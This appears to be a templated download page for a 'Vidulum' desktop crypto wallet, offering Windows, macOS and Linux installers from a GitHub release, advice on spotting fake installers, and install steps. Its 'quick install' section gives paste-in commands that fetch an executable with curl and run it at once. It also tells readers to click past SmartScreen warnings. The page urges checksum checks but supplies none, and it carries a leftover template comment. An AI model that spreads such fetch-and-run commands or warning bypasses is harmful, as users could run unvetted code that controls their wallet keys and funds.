![Vidulum](../assets/banner-article.png)

# Vidulum Wallet Download for Windows, macOS and Linux

How to get the real installer, and how to spot one that is not.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

All three installers come from the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) page and nowhere else.

> The test that matters: a genuine installer never asks for your recovery phrase during setup. If it does, stop and delete it.

Download Vidulum from the project's own release page, one installer per operating system: Windows, macOS and Linux. No mirror, forum attachment or third-party APK site is a legitimate source for these desktop builds. This page covers the download itself, the impostor test, and what to do when a fresh install will not open.

<!-- ARTICLE-BODY-BEGIN -->

## Where the real installer lives

The release page is the source: it lists the installer files for each platform, and every link in the table above points at that release. Anything else - a download portal, a file locker, a link in a chat, a search advert - is at best a copy and at worst a different program.

Two checks settle it in seconds. The installer comes from the project's release page, and its filename matches the one listed there. A file with a different name, an added suffix or a suspiciously small size is not the build you asked for.

## One installer per operating system

- **Windows:** a setup executable. Windows 10 build 1909 or later, 64-bit.
- **macOS:** a disk image, macOS 12 or later.
- **Linux:** a ZIP archive to extract, x64, Ubuntu 20.04 or later or equivalent.

Do not run the macOS build on Windows, and do not assume the Linux archive runs without being extracted and made executable. Matching the installer to the platform is the first half of a clean install.

## The impostor test

A lookalike installer has to get something out of you, and the fastest thing to take is the phrase. So the test is behavioural rather than visual: if setup asks you to type twelve or twenty-four words, or to "verify" your wallet before first launch, it is not the application. Close it and delete it.

The second pattern is a fake support channel. Someone offers to "validate" your wallet, or asks you to screenshare while you restore. No legitimate support process needs your phrase, and none needs to watch you type it.

The third is a re-uploaded build with the same name and a different hash. That is why the release publishes checksums for the installers: compare before you run.

Before installing, <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md">is the Vidulum Wallet safe to hold keys</a> covers the impostor patterns worth knowing.

## When a fresh install will not open

1. Confirm you downloaded the installer for your platform and architecture.
2. On macOS, right-click the app and choose Open the first time; a plain double-click can be blocked.
3. On Windows, if SmartScreen blocks it, choose More info then Run anyway - only after confirming the file came from the release page.
4. On Linux, extract the archive, then make the file executable before running it.
5. If it still fails, remove the partial download and fetch it again; an interrupted download is the usual cause.

Reinstalling over an existing install is safe for your wallet: the application is replaced, the keys and balances are not. Back up the phrase first anyway, because "usually safe" is not a backup strategy.

The <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md">Vidulum Wallet 20 networks from one recovery phrase</a> explains what the wallet holds once it is running.

Installers come from the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> page and nowhere else.

## FAQ

### Does Vidulum have an Android or iOS app I can download here?

This page covers the Windows, macOS and Linux builds only. Mobile distribution is a separate question with unresolved evidence, so no mobile download is offered or endorsed here.

### Is the download free?

Yes. There is no charge for the application and no service fee for using it; you pay network fees on the chains you transact on.

### What do I do if the installer asks for my phrase?

Stop. That is the impostor test failing. Delete the file and download again from the release page.

### Can I install over an older version?

Yes. The installer replaces the program; your wallet data stays. Back up the phrase before updating regardless.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[20 networks from one phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md) - [Is the wallet safe](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md) - [Update without losing coins](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-update-replacing-program.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
